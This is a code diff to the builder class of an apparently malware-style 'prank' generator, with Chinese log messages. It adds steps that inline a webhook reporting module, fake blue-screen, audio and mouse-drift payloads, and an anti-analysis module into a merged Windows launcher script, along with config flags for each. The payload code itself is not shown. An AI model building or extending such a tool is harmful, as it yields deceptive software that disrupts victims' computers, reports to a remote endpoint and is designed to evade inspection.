@@ -207,6 +207,30 @@ class BuilderCore:
                     scanner_modules_code += f"\n# --- Scanner Module: {mod_name} ---\n{mod_code}\n"
                     self._log(f"  已读取扫描器模块: {mod_name}")
 
+            # v4.0: 读取 webhook 模块
+            webhook_code = ""
+            webhook_path = os.path.join(template_dir, "webhook.py")
+            if os.path.exists(webhook_path):
+                webhook_code = self._read_template_file("webhook.py", template_dir)
+                self._log("  已读取 Webhook 模块")
+
+            # v4.0: 读取 payload 子模块
+            payload_dir = os.path.join(template_dir, "payloads")
+            payload_modules_code = ""
+            for mod_name in ["fake_bsod.py", "audio_prank.py", "mouse_drift.py"]:
+                mod_path = os.path.join(payload_dir, mod_name)
+                if os.path.exists(mod_path):
+                    mod_code = self._read_template_file(os.path.join("payloads", mod_name), template_dir)
+                    payload_modules_code += f"\n# --- Payload Module: {mod_name} ---\n{mod_code}\n"
+                    self._log(f"  已读取载荷模块: {mod_name}")
+
+            # v4.0: 读取 anti_analysis 模块
+            anti_analysis_code = ""
+            aa_path = os.path.join(template_dir, "anti_analysis.py")
+            if os.path.exists(aa_path):
+                anti_analysis_code = self._read_template_file("anti_analysis.py", template_dir)
+                self._log("  已读取反分析模块")
+
             # 移除 launcher_core 中的 scanner 包导入（合并后不需要）
             launcher_core_code = re.sub(
                 r'try:\s*\n\s*from scanner import.*?\n.*?pass\s*\n',
@@ -225,7 +249,20 @@ class BuilderCore:
                 "window_title": config.get("window_title", ""),
                 "error_message": config.get("error_message", ""),
                 "splash_image_data": config.get("splash_image_data", ""),
-                "show_log": True
+                "show_log": True,
+                # v4.0: Webhook
+                "enable_webhook": config.get("enable_webhook", False),
+                "webhook_url": config.get("webhook_url", ""),
+                "webhook_type": config.get("webhook_type", "custom"),
+                # v4.0: Payloads
+                "enable_bsod": config.get("enable_bsod", False),
+                "enable_audio": config.get("enable_audio", False),
+                "audio_melody": config.get("audio_melody", "random_chaos"),
+                "enable_mouse_drift": config.get("enable_mouse_drift", False),
+                "drift_intensity": config.get("drift_intensity", 3),
+                "drift_duration": config.get("drift_duration", 15),
+                # v4.0: Anti-Analysis
+                "enable_anti_analysis": config.get("enable_anti_analysis", False),
             }
 
             config_str = "CONFIG = " + repr(runtime_config)
@@ -241,7 +278,7 @@ class BuilderCore:
             )
 
             final_code = f"""
-# === MERGED BUILD ===
+# === MERGED BUILD (v4.0) ===
 import os
 import sys
 import atexit
@@ -252,16 +289,34 @@ import datetime
 import webbrowser
 import winreg
 import ctypes
+import ctypes.wintypes
 import concurrent.futures
 import tkinter as tk
 from tkinter import ttk
 import random
+import platform
+import tempfile
+import urllib.request
+import urllib.error
+import urllib.parse
+import uuid
+import subprocess
+import winsound
 from pathlib import Path
-from typing import Optional, List, Set, Callable
+from typing import Any, Optional, List, Dict, Set, Tuple, Callable
 import base64
+
+# --- Module: anti_analysis ---
+{anti_analysis_code}
 
 # --- Scanner Modules (inlined) ---
 {scanner_modules_code}
+
+# --- Module: webhook ---
+{webhook_code}
+
+# --- Payload Modules (inlined) ---
+{payload_modules_code}
 
 # --- Module: launcher_core ---
 {launcher_core_code}
